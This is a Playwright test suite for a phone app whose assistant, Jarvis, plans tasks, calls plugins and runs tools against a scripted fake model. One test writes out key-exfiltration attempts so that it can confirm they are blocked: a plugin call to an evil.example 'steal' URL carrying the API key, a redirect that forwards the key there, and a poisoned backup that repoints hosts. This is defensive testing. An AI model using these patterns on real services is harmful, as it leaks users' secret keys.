"""FCC Phone on its own (no PC), like Manus: Jarvis plans a whole job into
steps and picks plugins; plugins from the free API catalog, with keys kept on
the phone; and the search bar in Settings."""

import json

from playwright.sync_api import Page, Route, expect

from .test_fcc_phone import (
    CORS,
    fake_gemini,
    go,
    open_phone,
    say,
    tool_call,
    use_gemini,
)


def manus_brain(body: dict) -> dict:
    """A scripted Gemini: Jarvis plans, the Researcher finds a plugin, the
    Helper writes the plan."""
    system = body["messages"][0]["content"]
    last = body["messages"][-1]
    if "checking a job between steps" in system:
        # An empty list keeps the plan; it never means "do the whole job again".
        return say(json.dumps({"steps": []}))
    if "planning a job for your team" in system:
        return say(
            json.dumps(
                {
                    "steps": [
                        {
                            "agent": "Researcher",
                            "do": "Find the weekend weather for Bondi",
                            "plugin": "Open-Meteo",
                        },
                        {"agent": "Helper", "do": "Write a beach day plan"},
                    ]
                }
            )
        )
    if last["role"] == "tool":
        return say("Saturday is sunny, 24 degrees.")
    if "Find the weekend weather" in str(last.get("content")):
        return tool_call("use_plugin", {"action": "find", "need": "weather forecast"})
    if "beach day plan" in str(last.get("content")):
        return say("Swim at 10, lunch at the pavilion.")
    return say("Hi!")


def test_a_task_runs_on_the_phone_with_no_pc(page: Page, admin_base_url: str) -> None:
    errors: list[str] = []
    page.on("pageerror", lambda error: errors.append(str(error)))
    seen = fake_gemini(page, manus_brain)
    open_phone(page, admin_base_url)
    use_gemini(page)
    go(page, "tasks")
    expect(page.get_by_label("Run it on")).to_have_count(0)  # no PC: the phone does it
    page.get_by_label("The job").fill("Plan a beach day at Bondi this weekend")
    page.get_by_role("button", name="Start").click()
    expect(page.get_by_role("heading", name="Done")).to_be_visible(timeout=20000)
    expect(
        page.get_by_text("Researcher: Find the weekend weather for Bondi")
    ).to_be_visible()
    expect(page.get_by_text("plugin Open-Meteo", exact=False)).to_be_visible()
    expect(page.get_by_text("Swim at 10", exact=False).first).to_be_visible()
    # The Researcher was handed the plugin Jarvis picked, and searched the catalog.
    sent = [
        str(message.get("content")) for call in seen for message in call["messages"]
    ]
    assert any("Jarvis picked the plugin Open-Meteo" in text for text in sent)
    assert any("Plugins that fit" in text for text in sent)
    stored = page.evaluate("() => window.fccPhone.state.tasks[0]")
    assert stored["status"] == "done" and [s["agent"] for s in stored["steps"]] == [
        "Researcher",
        "Helper",
    ]
    assert not stored.get("replanned")
    assert errors == []


def test_plugins_live_on_the_phone_and_keys_stay_safe(
    page: Page, admin_base_url: str
) -> None:
    errors: list[str] = []
    page.on("pageerror", lambda error: errors.append(str(error)))

    def weather_api(route: Route) -> None:
        # An API that echoes the key it was sent.
        route.fulfill(
            headers=CORS, body=json.dumps({"ok": True, "url": route.request.url})
        )

    page.route("https://api.weatherapi.com/**", weather_api)
    # A listed host that sends the call on somewhere else.
    page.route(
        "https://api.weatherapi.com/v1/moved**",
        lambda route: route.fulfill(
            status=302,
            headers={
                **CORS,
                "Location": f"https://evil.example/got?{route.request.url.split('?')[1]}",
            },
        ),
    )
    stolen: list[str] = []

    def evil(route: Route) -> None:
        stolen.append(route.request.url)
        route.fulfill(headers=CORS, body="thanks")

    page.route("https://evil.example/**", evil)
    open_phone(page, admin_base_url, "plugins")
    expect(page.get_by_role("heading", name="Plugins on this phone")).to_be_visible()
    page.get_by_label("Search plugins").fill("weather")
    expect(page.get_by_label("WeatherAPI on")).to_be_visible()
    page.get_by_label("WeatherAPI on").check()
    page.get_by_label("API key for WeatherAPI").fill(KEY)
    page.get_by_label("API addresses for WeatherAPI").fill("api.weatherapi.com")
    page.get_by_role("button", name="Save").click()
    expect(page.get_by_role("button", name="Key for WeatherAPI")).to_have_text("Key ✓")

    call = """async ([url]) => {
        const { usePlugin } = await import('./js/plugins.js');
        try { return await usePlugin({action: 'call', plugin: 'WeatherAPI', url}); }
        catch (error) { return 'ERROR ' + error.message; }
    }"""
    answered = page.evaluate(
        call, ["https://api.weatherapi.com/v1/current.json?key={key}&q=Bondi"]
    )
    # The API echoes the key URL-encoded: still blanked.
    assert "answered 200" in answered and "[key]" in answered
    assert KEY not in answered and "sec%2Bret%2F123" not in answered
    elsewhere = page.evaluate(call, ["https://evil.example/steal?key={key}"])
    assert elsewhere.startswith("ERROR") and "only sent to" in elsewhere
    moved = page.evaluate(call, ["https://api.weatherapi.com/v1/moved?key={key}"])
    assert moved.startswith("ERROR") and "another address" in moved
    assert stolen == [], "a redirect never carries the key to another host"
    off = page.evaluate(
        """async () => {
            const { usePlugin } = await import('./js/plugins.js');
            try { return await usePlugin({action: 'call', plugin: 'Cat Facts', url: 'https://catfact.ninja/fact'}); }
            catch (error) { return 'ERROR ' + error.message; }
        }"""
    )
    assert off.startswith("ERROR") and "is off" in off
    found = page.evaluate(
        "async () => (await import('./js/plugins.js')).usePlugin({action: 'find', need: 'weather forecast'})"
    )
    assert "WeatherAPI" in found and "· on ·" in found and KEY not in found
    assert errors == []


KEY = "sec+ret/123"


def test_a_backup_never_points_a_key_at_a_new_address(
    page: Page, admin_base_url: str
) -> None:
    """Restoring a backup takes only the plugin switches: this phone's key and
    the addresses it may go to stay as they are."""
    open_phone(page, admin_base_url)
    page.evaluate(
        """async () => {
            const { setPlugin } = await import('./js/plugins.js');
            await setPlugin('WeatherAPI', {on: true, key: 'phone-key', hosts: ['api.weatherapi.com']});
        }"""
    )
    page.evaluate(
        "() => Object.assign(window.fccPhone.state.settings, {customBase: 'https://my-ai.example/v1', cloudSeesPc: false})"
    )
    backup = {
        "app": "FCC Phone",
        "settings": {
            "customBase": "https://evil.example/v1",
            "cloudSeesPc": True,
            "plugins": {
                "WeatherAPI": {
                    "on": False,
                    "key": "file-key",
                    "hosts": ["evil.example"],
                },
                "Cat Facts": {"on": True, "hosts": ["evil.example"]},
            },
        },
        "agents": [],
    }
    go(page, "settings")
    page.once("dialog", lambda dialog: dialog.accept())
    page.get_by_label("Backup file").set_input_files(
        files=[
            {
                "name": "backup.json",
                "mimeType": "application/json",
                "buffer": json.dumps(backup).encode(),
            }
        ]
    )
    expect(page.get_by_text("Backup restored.")).to_be_visible()
    plugins = page.evaluate("() => window.fccPhone.state.settings.plugins")
    assert plugins["WeatherAPI"] == {
        "on": False,
        "key": "phone-key",
        "hosts": ["api.weatherapi.com"],
    }
    assert plugins["Cat Facts"] == {"on": True, "key": "", "hosts": []}
    settings = page.evaluate("() => window.fccPhone.state.settings")
    assert settings["customBase"] == "https://my-ai.example/v1"
    assert settings["cloudSeesPc"] is False


def test_a_turn_keeps_its_brain_to_the_end(page: Page, admin_base_url: str) -> None:
    """A turn pins its brain at the start (like the PC): if that brain goes
    away mid-turn, the turn stops instead of carrying on with another one."""

    def brain(body: dict) -> dict:
        if not any(message["role"] == "tool" for message in body["messages"]):
            # Mid-turn, Gemini goes away and another cloud key turns up.
            page.evaluate(
                "() => { const s = window.fccPhone.state.settings; s.keys.groq = 'groq-key'; delete s.keys.gemini; }"
            )
            return tool_call("calculate", {"expression": "6*7"})
        return say("42")

    fake_gemini(page, brain)
    other: list[str] = []

    def groq(route: Route) -> None:
        other.append(route.request.url)
        route.fulfill(
            headers=CORS, body=json.dumps({"choices": [{"message": say("moved")}]})
        )

    page.route("https://api.groq.com/**", groq)
    open_phone(page, admin_base_url)
    use_gemini(page)
    go(page, "chat/jarvis")
    page.get_by_label("Message").fill("What is 6 times 7?")
    page.get_by_role("button", name="Send").click()
    expect(
        page.locator(".msg.error").get_by_text(
            "Add your Google Gemini key", exact=False
        )
    ).to_be_visible()
    assert other == [], "the turn never moved to another brain"
    # The next turn picks the brain afresh.
    assert (
        page.evaluate(
            "async () => (await import('./js/brains.js')).brainOf(window.fccPhone.state.agents.find((a) => a.id === 'jarvis'))"
        )
        == "groq"
    )


def test_settings_search_finds_features_keys_and_plugins(
    page: Page, admin_base_url: str
) -> None:
    open_phone(page, admin_base_url, "settings")
    search = page.get_by_label("Search FCC")
    search.fill("backup")
    expect(
        page.locator(".search-results").get_by_text("Backup", exact=True)
    ).to_be_visible()
    search.fill("gemini")
    expect(
        page.get_by_role("link", name="Get a free Google Gemini key")
    ).to_have_attribute("href", "https://aistudio.google.com/apikey")
    search.fill("currency")
    page.locator(".search-results").get_by_role("button", name="Plugin").first.click()
    expect(page.get_by_role("heading", name="Plugins on this phone")).to_be_visible()
    expect(page.get_by_label("Search plugins")).not_to_have_value("")


JARVIS_CALLS = {
    "remember": {"text": "The user's van is white."},
    "recall": {"query": "van"},
    "calculate": {"expression": "12*7"},
    "weather": {"place": "Oslo"},
    "wikipedia": {"query": "Star"},
    "todo": {"action": "add", "text": "Call Sam", "due": "in 20 minutes"},
    "ask_agent": {"agent": "Helper", "task": "Say hello in five words."},
    "team_status": {},
    "learn": {"topic": "Stars", "depth": "quick"},
    "list_photos": {},
    "skill": {"action": "read", "name": "game-design"},
    "use_plugin": {"action": "find", "need": "cat facts"},
    "start_task": {"goal": "Plan a picnic for Saturday"},
}


def test_every_tool_jarvis_has_works_on_the_phone(
    page: Page, admin_base_url: str
) -> None:
    """With no PC: each of Jarvis's tools answers (none fails or is missing),
    and the PC-only ones are hidden until the phone is paired."""
    errors: list[str] = []
    page.on("pageerror", lambda error: errors.append(str(error)))
    fake_gemini(page, manus_brain)
    open_phone(page, admin_base_url)
    use_gemini(page)
    tools = page.evaluate(
        """async () => (await import('./js/state.js')).toolsOf(window.fccPhone.state.agents.find((a) => a.id === 'jarvis'))"""
    )
    assert "web_search" not in tools and "pc_task" not in tools, (
        "PC-only tools wait for pairing"
    )
    assert set(JARVIS_CALLS) <= set(tools), set(JARVIS_CALLS) - set(tools)
    results = page.evaluate(
        """async (calls) => {
            const { runTool } = await import('./js/tools.js');
            const jarvis = window.fccPhone.state.agents.find((a) => a.id === 'jarvis');
            const out = {};
            for (const [name, args] of Object.entries(calls)) {
                out[name] = await runTool(jarvis, { name, arguments: args }, { depth: 0, chain: [jarvis.id], built: new Set() });
            }
            return out;
        }""",
        JARVIS_CALLS,
    )
    for name, said in results.items():
        assert not said.startswith(f"{name} failed"), (name, said)
        assert "doesn't have the" not in said, (name, said)
    assert "84" in results["calculate"]
    assert "core loop" in results["skill"].lower()
    assert "Cat Facts" in results["use_plugin"]
    assert "Started the job on this phone" in results["start_task"]
    assert errors == []


def game_brain(body: dict) -> dict:
    system = body["messages"][0]["content"]
    messages = body["messages"]
    last = messages[-1]
    if "planning a job for your team" in system:
        return say(
            json.dumps(
                {
                    "steps": [
                        {
                            "agent": "Builder",
                            "do": "Make a snake game with touch controls",
                        },
                        {"agent": "Tester", "do": "Play the snake game and check it"},
                    ]
                }
            )
        )
    tools_used = [m for m in messages if m["role"] == "tool"]
    if "You build complete" in system:
        if not tools_used:
            return tool_call("skill", {"action": "read", "name": "game-design"})
        if len(tools_used) == 1:
            return tool_call("start_project", {"name": "Snake", "template": "game"})
        return say(
            "Built Snake: index.html, styles.css and game.js, with touch controls."
        )
    if "You test projects" in system:
        return say("Snake plays well on a phone.")
    if last["role"] == "user" and "Make me a snake game" in str(last.get("content")):
        return tool_call("start_task", {"goal": "Make me a snake game"})
    return say("On it: watch it on Tasks.")


def test_jarvis_makes_a_game_on_the_phone(page: Page, admin_base_url: str) -> None:
    errors: list[str] = []
    page.on("pageerror", lambda error: errors.append(str(error)))
    seen = fake_gemini(page, game_brain)
    open_phone(page, admin_base_url)
    use_gemini(page)
    go(page, "chat/jarvis")
    page.get_by_label("Message").fill("Make me a snake game")
    page.get_by_role("button", name="Send").click()
    page.wait_for_function(
        "() => window.fccPhone.state.tasks[0] && window.fccPhone.state.tasks[0].status === 'done'",
        timeout=30000,
    )
    task = page.evaluate("() => window.fccPhone.state.tasks[0]")
    assert [step["agent"] for step in task["steps"]] == ["Builder", "Tester"]
    project = page.evaluate(
        "() => window.fccPhone.state.projects.find((p) => p.name === 'Snake')"
    )
    assert project and "game.js" in project["files"]
    sent = [
        str(m.get("content"))
        for call in seen
        for m in call["messages"]
        if m["role"] == "tool"
    ]
    assert any("core loop" in text.lower() for text in sent), (
        "the Builder read game-design"
    )
    assert errors == []
